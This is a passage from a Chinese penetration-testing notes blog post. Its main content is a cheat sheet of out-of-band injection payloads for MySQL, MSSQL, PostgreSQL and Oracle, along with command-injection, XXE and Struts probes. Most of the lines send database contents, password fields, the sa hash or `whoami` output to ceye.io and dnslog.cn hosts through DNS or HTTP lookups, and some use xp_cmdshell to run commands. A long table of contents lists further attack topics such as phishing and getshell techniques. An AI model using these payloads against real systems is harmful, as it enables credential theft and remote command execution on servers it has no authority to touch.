http://url/index.php?id=-1 union select 1,(select concat(`3`,0x3a,`4`) from (select 1,2,3,4,5,6 union select * from users)a limit 1,1)-- -
</code></pre><h4 id="DNSLog"><a href="#DNSLog" class="headerlink" title="DNSLog"></a>DNSLog</h4><pre><code>http://ceye.io
http://www.dnslog.cn/
</code></pre><h5 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h5><h6 id="MYSQL"><a href="#MYSQL" class="headerlink" title="MYSQL"></a>MYSQL</h6><pre><code>显示数据库
?id=1&#39; and if((select load_file(concat(&#39;\\\\&#39;,(select database()),&#39;.jhsefs.ceye.io\\sql_test&#39;))),1,0)--+
显示数据库
?id=1&#39; and if((select load_file(concat(&#39;\\\\&#39;,(select schema_name from information_schema.schemata limit &#123;0&#125;,1),&#39;.jhsefs.ceye.io\\sql_test&#39;))),1,0)--+
显示表
?id=1&#39; and if((select load_file(concat(&#39;\\\\&#39;,(select table_name from information_schema.tables where table_schema=&#39;dbname&#39; limit 0,1),&#39;.jhsefs.ceye.io\\sql_test&#39;))),1,0)--+
?id=1&#39; and if((select load_file(concat(&#39;\\\\&#39;,(select table_name from information_schema.tables where table_schema=0x1x1x2x limit 0,1),&#39;.jhsefs.ceye.io\\sql_test&#39;))),1,0)--+
显示字段
?id=1&#39; and if((select load_file(concat(&#39;\\\\&#39;,(select column_name from information_schema.columns where table_name=&#39;users&#39; limit 0,1),&#39;.jhsefs.ceye.io\\sql_test&#39;))),1,0)--+
显示数据
?id=1&#39; and if((select load_file(concat(&#39;\\\\&#39;,(select hex(user) from users limit 0,1),&#39;.jhsefs.ceye.io\\sql_test&#39;))),1,0)--+
</code></pre><h6 id="MSSQL-2"><a href="#MSSQL-2" class="headerlink" title="MSSQL"></a>MSSQL</h6><pre><code>查数据
?id=1;DECLARE @host varchar(1024);SELECT @host=(SELECT master.dbo.fn_varbintohexstr(convert(varbinary,rtrim(pass))) FROM test.dbo.test_user where [USER] = &#39;admin&#39;)%2b&#39;.cece.nk40ci.ceye.io&#39;;EXEC(&#39;master..xp_dirtree &quot;\&#39;%2b@host%2b&#39;\foobar$&quot;&#39;);
Sa密码
?id=1DECLARE @host varchar(1024);SELECT @host=(SELECT TOP 1 master.dbo.fn_varbintohexstr(password_hash)FROM sys.sql_loginsWHERE name=&#39;sa&#39;)+&#39;.ip.port.b182oj.ceye.io&#39;;EXEC(&#39;master..xp_dirtree&quot;\&#39;+@host+&#39;\foobar$&quot;&#39;);
执行命令
exec master..xp_cmdshell &quot;whoami&gt;D:/temp%26%26certutil -encode D:/temp D:/temp2%26%26findstr /L /V &quot;&quot;CERTIFICATE&quot;&quot; D:/temp2&gt;D:/temp3&quot;;
exec master..xp_cmdshell &quot;cmd /v /c&quot;&quot;set /p MYVAR=&lt; D:/temp3 %26%26 set FINAL=!MYVAR!.xxx.ceye.io %26%26 ping !FINAL!&quot;&quot;&quot;;
exec master..xp_cmdshell &quot;del &quot;&quot;D:/temp&quot;&quot; &quot;&quot;D:/temp2&quot;&quot; &quot;&quot;D:/temp3&quot;&quot;&quot;;
</code></pre><h6 id="postgreSQL"><a href="#postgreSQL" class="headerlink" title="postgreSQL"></a>postgreSQL</h6><pre><code>?id=1;DROP TABLE IF EXISTS table_output;CREATE TABLE table_output(content text);CREATE OR REPLACE FUNCTION temp_function() RETURNS VOID AS $$ DECLARE exec_cmd TEXT;DECLARE query_result TEXT;BEGIN SELECT INTO query_result (select encode(pass::bytea,&#39;hex&#39;) from test_user where id =1);exec_cmd := E&#39;COPY table_output(content) FROM E\&#39;\\\\\\\\&#39;||query_result||E&#39;.pSQL.3.nk40ci.ceye.io\\\\foobar.txt\&#39;&#39;;EXECUTE exec_cmd;END;$$ LANGUAGE plpgSQL SECURITY DEFINER;SELECT temp_function();
</code></pre><h6 id="Oracle"><a href="#Oracle" class="headerlink" title="Oracle"></a>Oracle</h6><pre><code>?id=1 union SELECT UTL_HTTP.REQUEST((select pass from test_user where id=1)||&#39;.nk40ci.ceye.io&#39;) FROM sys.DUAL;
?id=1 union SELECT DBMS_LDAP.INIT((select pass from test_user where id=1)||&#39;.nk40ci.ceye.io&#39;,80) FROM sys.DUAL;
?id=1 union SELECT HTTPURITYPE((select pass from test_user where id=1)||&#39;.xx.nk40ci.ceye.io&#39;).GETCLOB() FROM sys.DUAL;
?id=1 union SELECT UTL_INADDR.GET_HOST_ADDRESS((select pass from test_user where id=1)||&#39;.ddd.nk40ci.ceye.io&#39;) FROM sys.DUAL;
</code></pre><h5 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h5><pre><code>&gt;curl http://0ox095.ceye.io/`whoami`
&gt;ping `whoami`.b182oj.ceye.io
&gt;ping %CD%.lfofz7.dnslog.cn 
&amp;
cmd /v /c &quot;whoami &gt; temp &amp;&amp; certutil -encode temp temp2 &amp;&amp; findstr /L /V &quot;CERTIFICATE&quot; temp2 &gt; temp3 &amp;&amp; set /p MYVAR=&lt; temp3 &amp;&amp; set FINAL=!MYVAR!.xxx.ceye.io &amp;&amp; nslookup !FINAL!&quot;
</code></pre><h5 id="XXE-1"><a href="#XXE-1" class="headerlink" title="XXE"></a>XXE</h5><pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;!DOCTYPE root [
&lt;!ENTITY % remote SYSTEM &quot;http://b182oj.ceye.io/xxe_test&quot;&gt;
%remote;]&gt;
&lt;root/&gt;
</code></pre><h5 id="Struts"><a href="#Struts" class="headerlink" title="Struts"></a>Struts</h5><pre><code>xx.action?redirect:http://b182oj.ceye.io/%25&#123;3*4&#125;
xx.action?redirect:$
</code></pre></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:ptilopsis@rhinelab.top">猫猫</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://nek0neko.github.io/2022/02/14/%E7%9F%A5%E8%AF%86%E7%AC%94%E8%AE%B01/">https://nek0neko.github.io/2022/02/14/%E7%9F%A5%E8%AF%86%E7%AC%94%E8%AE%B01/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://nek0neko.github.io" target="_blank">猫猫的胡言</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E7%9F%A5%E8%AF%86%E7%AC%94%E8%AE%B0/">知识笔记</a></div><div class="post_share"><div class="social-share" data-image="https://tva4.sinaimg.cn/large/0072Vf1pgy1foxk6v6t1kj31kw0w0e6l.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2022/02/05/Google-Hacking/"><img class="next-cover" src="https://tva3.sinaimg.cn/large/0072Vf1pgy1foxlhn4alzj31hc0u0aq3.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Google Hacking</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://cdn.jsdelivr.net/gh/nek0neko/ImageHost/202202051822882.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">猫猫</div><div class="author-info__description">Solve Intelligence. Think Different</div></div><div class="card-info-data is-center"><div class="card-info-data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">2</div></a></div><div class="card-info-data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">1</div></a></div><div class="card-info-data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/nek0neko"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Pentest-Note"><span class="toc-number">1.</span> <span class="toc-text">Pentest_Note</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A3%B0%E6%98%8E1%EF%BC%9A"><span class="toc-number">1.0.1.</span> <span class="toc-text">声明1：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A3%B0%E6%98%8E2%EF%BC%9A"><span class="toc-number">1.0.2.</span> <span class="toc-text">声明2：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.</span> <span class="toc-text">信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Whois"><span class="toc-number">2.1.</span> <span class="toc-text">Whois</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BD%91%E7%AB%99IP"><span class="toc-number">2.2.</span> <span class="toc-text">网站IP</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8CDN"><span class="toc-number">2.2.1.</span> <span class="toc-text">是否存在CDN</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Bypass-cdn%E5%B8%B8%E8%A7%84%E6%96%B9%E5%BC%8F"><span class="toc-number">2.2.2.</span> <span class="toc-text">Bypass cdn常规方式</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%9F%E5%90%8D%E5%8E%86%E5%8F%B2IP"><span class="toc-number">2.3.</span> <span class="toc-text">域名历史IP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BD%91%E7%AB%99%E6%9E%B6%E6%9E%84-%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%8C%87%E7%BA%B9-CMS%E8%AF%86%E5%88%AB-%E5%AE%B9%E5%99%A8"><span class="toc-number">2.4.</span> <span class="toc-text">网站架构&#x2F;服务器指纹&#x2F;CMS识别&#x2F;容器</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%90%E5%9F%9F%E5%90%8D"><span class="toc-number">2.5.</span> <span class="toc-text">子域名</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BD%91%E7%AB%99%E4%BD%BF%E7%94%A8%E7%9A%84CMS%E7%9A%84%E5%AE%98%E6%96%B9demo%E7%AB%99"><span class="toc-number">2.6.</span> <span class="toc-text">网站使用的CMS的官方demo站</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSL%E8%AF%81%E4%B9%A6%E4%BF%A1%E6%81%AF"><span class="toc-number">2.7.</span> <span class="toc-text">SSL证书信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DNS%E5%8E%86%E5%8F%B2%E8%A7%A3%E6%9E%90%E8%AE%B0%E5%BD%95"><span class="toc-number">2.8.</span> <span class="toc-text">DNS历史解析记录</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8C%E6%9C%8D%E7%AB%99%E7%82%B9%E6%83%85%E5%86%B5"><span class="toc-number">2.9.</span> <span class="toc-text">同服站点情况</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8C%E6%A0%B7%E6%9E%B6%E6%9E%84%E6%88%96%E6%BA%90%E7%A0%81%E7%9A%84%E7%AB%99"><span class="toc-number">2.10.</span> <span class="toc-text">同样架构或源码的站</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BD%91%E7%AB%99js"><span class="toc-number">2.11.</span> <span class="toc-text">网站js</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BD%91%E7%AB%99%E4%BD%BF%E7%94%A8%E7%9A%84%E7%AC%AC%E4%B8%89%E6%96%B9js"><span class="toc-number">2.12.</span> <span class="toc-text">网站使用的第三方js</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%91%E4%BF%A1%E6%81%AF"><span class="toc-number">2.13.</span> <span class="toc-text">云信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#APP%E5%8F%8D%E7%BC%96%E8%AF%91"><span class="toc-number">2.14.</span> <span class="toc-text">APP反编译</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#C%E6%AE%B5-B%E6%AE%B5%E4%BF%A1%E6%81%AF"><span class="toc-number">2.15.</span> <span class="toc-text">C段&#x2F;B段信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7"><span class="toc-number">2.16.</span> <span class="toc-text">工具</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E5%AF%B9%E5%A4%96%E5%BC%80%E6%94%BE%E6%83%85%E5%86%B5"><span class="toc-number">2.17.</span> <span class="toc-text">端口对外开放情况</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F-%E7%88%AC%E8%99%AB-%E6%85%8E%E7%94%A8"><span class="toc-number">2.18.</span> <span class="toc-text">目录扫描&#x2F;爬虫(慎用)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WAF%E6%83%85%E5%86%B5%E8%AF%86%E5%88%AB"><span class="toc-number">2.19.</span> <span class="toc-text">WAF情况识别</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9A%8F%E6%89%8B%E6%B5%8B%E8%AF%95"><span class="toc-number">2.20.</span> <span class="toc-text">随手测试</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E"><span class="toc-number">2.21.</span> <span class="toc-text">搜索引擎</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Shodan-fofa-zoomeye"><span class="toc-number">2.22.</span> <span class="toc-text">Shodan&#x2F;fofa&#x2F;zoomeye</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Google-dorks"><span class="toc-number">2.23.</span> <span class="toc-text">Google dorks</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="toc-number">2.24.</span> <span class="toc-text">信息泄露</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BD%91%E9%A1%B5%E7%BC%93%E5%AD%98"><span class="toc-number">2.25.</span> <span class="toc-text">网页缓存</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%BE%E7%89%87%E5%8F%8D%E6%9F%A5"><span class="toc-number">2.26.</span> <span class="toc-text">图片反查</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A4%BE%E4%BA%A4"><span class="toc-number">2.27.</span> <span class="toc-text">社交</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%8B%E6%9C%BA%E5%8F%B7%E5%8A%A0%E5%85%A5%E9%80%9A%E8%AE%AF%E5%BD%95%E5%8C%B9%E9%85%8D%E5%90%84%E4%B8%AAAPP%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF"><span class="toc-number">2.28.</span> <span class="toc-text">手机号加入通讯录匹配各个APP用户信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%86%8C%E8%BF%87%E7%9A%84%E7%BD%91%E7%AB%99"><span class="toc-number">2.29.</span> <span class="toc-text">注册过的网站</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%AE%E6%A0%87%E4%BA%BA%E5%91%98%E7%9A%84%E5%85%B4%E8%B6%A3"><span class="toc-number">2.30.</span> <span class="toc-text">目标人员的兴趣</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%82%AE%E7%AE%B1%E6%90%9C%E9%9B%86"><span class="toc-number">2.31.</span> <span class="toc-text">邮箱搜集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exchange"><span class="toc-number">2.32.</span> <span class="toc-text">Exchange</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%AA%8C%E8%AF%81%E9%82%AE%E7%AE%B1%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8"><span class="toc-number">2.33.</span> <span class="toc-text">验证邮箱是否存在</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%86%E5%8F%B2%E6%B3%84%E9%9C%B2%E8%BF%87%E7%9A%84%E8%B5%84%E6%96%99%E7%AD%89"><span class="toc-number">2.34.</span> <span class="toc-text">历史泄露过的资料等</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Github-Gitee%E7%AD%89%E4%BB%A3%E7%A0%81%E6%89%98%E7%AE%A1%E5%B9%B3%E5%8F%B0"><span class="toc-number">2.35.</span> <span class="toc-text">Github&#x2F;Gitee等代码托管平台</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A2%AB%E5%85%A5%E4%BE%B5%E7%BD%91%E5%9D%80%E5%88%97%E8%A1%A8"><span class="toc-number">2.36.</span> <span class="toc-text">被入侵网址列表</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#GPS%E6%9F%A5%E8%AF%A2"><span class="toc-number">2.37.</span> <span class="toc-text">GPS查询</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BD%91%E7%AB%99URL%E6%8F%90%E5%8F%96"><span class="toc-number">2.38.</span> <span class="toc-text">网站URL提取</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%9C%9C%E7%BD%90%E5%88%A4%E6%96%AD-%E5%8F%82%E8%80%83%E4%B8%80%E4%B8%8B%E5%8D%B3%E5%8F%AF"><span class="toc-number">2.39.</span> <span class="toc-text">蜜罐判断(参考一下即可)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%BB%98%E8%AE%A4%E5%AF%86%E7%A0%81"><span class="toc-number">2.40.</span> <span class="toc-text">默认密码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A6%82%E9%9C%80%E6%B3%A8%E5%86%8C"><span class="toc-number">2.41.</span> <span class="toc-text">如需注册</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BC%81%E4%B8%9A%E4%BF%A1%E6%81%AF"><span class="toc-number">2.42.</span> <span class="toc-text">企业信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#win10-%E5%AE%89%E8%A3%85kali-wsl"><span class="toc-number">2.43.</span> <span class="toc-text">win10 安装kali(wsl)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B0%B4%E5%9D%91%E6%94%BB%E5%87%BB"><span class="toc-number">2.44.</span> <span class="toc-text">水坑攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#XSS%E5%85%8B%E9%9A%86%E9%92%93%E9%B1%BC"><span class="toc-number">2.44.1.</span> <span class="toc-text">XSS克隆钓鱼</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BC%AA%E9%80%A0%E9%A1%B5%E9%9D%A2%E9%92%93%E9%B1%BC"><span class="toc-number">2.44.2.</span> <span class="toc-text">伪造页面钓鱼</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1"><span class="toc-number">2.44.2.1.</span> <span class="toc-text">1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2"><span class="toc-number">2.44.2.2.</span> <span class="toc-text">2</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%B9%E5%A4%96%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB"><span class="toc-number">2.45.</span> <span class="toc-text">对外服务攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Web"><span class="toc-number">2.45.1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%89%8D%E7%AB%AF-%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.45.1.1.</span> <span class="toc-text">前端&#x2F;逻辑漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B3%A8%E5%86%8C"><span class="toc-number">2.45.1.1.1.</span> <span class="toc-text">注册</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%99%BB%E5%BD%95"><span class="toc-number">2.45.1.1.2.</span> <span class="toc-text">登录</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BB%BB%E6%84%8F%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE"><span class="toc-number">2.45.1.1.3.</span> <span class="toc-text">任意密码重置</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2-1"><span class="toc-number">2.45.1.1.4.</span> <span class="toc-text">信息泄露</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%90%8E%E5%8F%B0"><span class="toc-number">2.45.1.1.5.</span> <span class="toc-text">后台</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#JWT%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95"><span class="toc-number">2.45.1.2.</span> <span class="toc-text">JWT攻击手法</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9C%AA%E6%A0%A1%E9%AA%8C%E7%AD%BE%E5%90%8D"><span class="toc-number">2.45.1.2.1.</span> <span class="toc-text">未校验签名</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%A6%81%E7%94%A8%E5%93%88%E5%B8%8C"><span class="toc-number">2.45.1.2.2.</span> <span class="toc-text">禁用哈希</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9A%B4%E7%A0%B4%E5%BC%B1%E5%AF%86%E9%92%A5"><span class="toc-number">2.45.1.2.3.</span> <span class="toc-text">暴破弱密钥</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#XSS"><span class="toc-number">2.45.1.3.</span> <span class="toc-text">XSS</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CSRF"><span class="toc-number">2.45.1.4.</span> <span class="toc-text">CSRF</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#php%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96-%E4%B8%8B%E8%BD%BD"><span class="toc-number">2.45.1.5.</span> <span class="toc-text">php任意文件读取&#x2F;下载</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">2.45.1.6.</span> <span class="toc-text">php文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E5%8D%8F%E8%AE%AE"><span class="toc-number">2.45.1.6.1.</span> <span class="toc-text">常用协议</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Getshell"><span class="toc-number">2.45.1.6.2.</span> <span class="toc-text">Getshell</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#allow-url-include-%E5%BC%80%E5%90%AF%E6%97%B6Getshell"><span class="toc-number">2.45.1.6.2.1.</span> <span class="toc-text">allow_url_include 开启时Getshell</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#allow-url-include-%E5%85%B3%E9%97%AD%E6%97%B6Getshell"><span class="toc-number">2.45.1.6.2.2.</span> <span class="toc-text">allow_url_include 关闭时Getshell</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%8C%85%E5%90%AB%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6getshell"><span class="toc-number">2.45.1.6.2.3.</span> <span class="toc-text">包含日志文件getshell</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%B8%8A%E4%BC%A0%E4%B8%AA%E5%9B%BE%E7%89%87%E6%A0%BC%E5%BC%8F%E7%9A%84%E6%9C%A8%E9%A9%AC%E7%9B%B4%E6%8E%A5%E5%8C%85%E5%90%AB"><span class="toc-number">2.45.1.6.2.4.</span> <span class="toc-text">上传个图片格式的木马直接包含</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E9%99%90%E5%88%B6%E5%90%8E%E7%BC%80%E6%97%B6"><span class="toc-number">2.45.1.6.2.5.</span> <span class="toc-text">限制后缀时</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#phpinfo-LFI-%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6getshell"><span class="toc-number">2.45.1.6.2.6.</span> <span class="toc-text">phpinfo-LFI 本地文件包含临时文件getshell</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#session-lfi-getshell"><span class="toc-number">2.45.1.6.2.7.</span> <span class="toc-text">session + lfi getshell</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#LFI-SSH-Log"><span class="toc-number">2.45.1.6.2.8.</span> <span class="toc-text">LFI SSH Log</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#RFI-amp-%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E4%B8%8A%E7%BA%BFMSF"><span class="toc-number">2.45.1.6.2.9.</span> <span class="toc-text">RFI&amp;命令注入上线MSF</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#XML"><span class="toc-number">2.45.1.7.</span> <span class="toc-text">XML</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#XML%E6%B3%A8%E5%85%A5"><span class="toc-number">2.45.1.7.1.</span> <span class="toc-text">XML注入</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#XXE"><span class="toc-number">2.45.1.7.2.</span> <span class="toc-text">XXE</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%88%A4%E6%96%AD"><span class="toc-number">2.45.1.7.2.1.</span> <span class="toc-text">判断</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%8C%96%E6%8E%98"><span class="toc-number">2.45.1.7.2.2.</span> <span class="toc-text">挖掘</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%9C%89%E5%9B%9E%E6%98%BE%E8%AF%BB%E5%8F%96%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6"><span class="toc-number">2.45.1.7.2.3.</span> <span class="toc-text">有回显读取本地文件</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#Blind-OOB-XXE%E6%97%A0%E5%9B%9E%E6%98%BE%E8%AF%BB%E5%8F%96"><span class="toc-number">2.45.1.7.2.4.</span> <span class="toc-text">Blind OOB XXE无回显读取</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%88%97%E7%9B%AE%E5%BD%95"><span class="toc-number">2.45.1.7.2.5.</span> <span class="toc-text">列目录</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E4%B8%8D%E5%90%8C%E5%B9%B3%E5%8F%B0%E6%94%AF%E6%8C%81%E7%9A%84%E5%8D%8F%E8%AE%AE"><span class="toc-number">2.45.1.7.2.6.</span> <span class="toc-text">不同平台支持的协议</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="toc-number">2.45.1.7.2.7.</span> <span class="toc-text">执行命令</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E4%B8%BB%E6%9C%BA%E6%8E%A2%E6%B5%8B"><span class="toc-number">2.45.1.7.2.8.</span> <span class="toc-text">内网主机探测</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">2.45.1.7.2.9.</span> <span class="toc-text">内网端口扫描</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E5%86%85%E9%83%A8DTD%E5%88%A9%E7%94%A8"><span class="toc-number">2.45.1.7.2.10.</span> <span class="toc-text">内部DTD利用</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#Linux"><span class="toc-number">2.45.1.7.2.11.</span> <span class="toc-text">Linux</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#Windows"><span class="toc-number">2.45.1.7.2.12.</span> <span class="toc-text">Windows</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#XXE%E5%86%99shell"><span class="toc-number">2.45.1.7.2.13.</span> <span class="toc-text">XXE写shell</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#SSRF"><span class="toc-number">2.45.1.8.</span> <span class="toc-text">SSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%9A%E4%B9%89"><span class="toc-number">2.45.1.8.1.</span> <span class="toc-text">定义</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%88%90%E5%9B%A0"><span 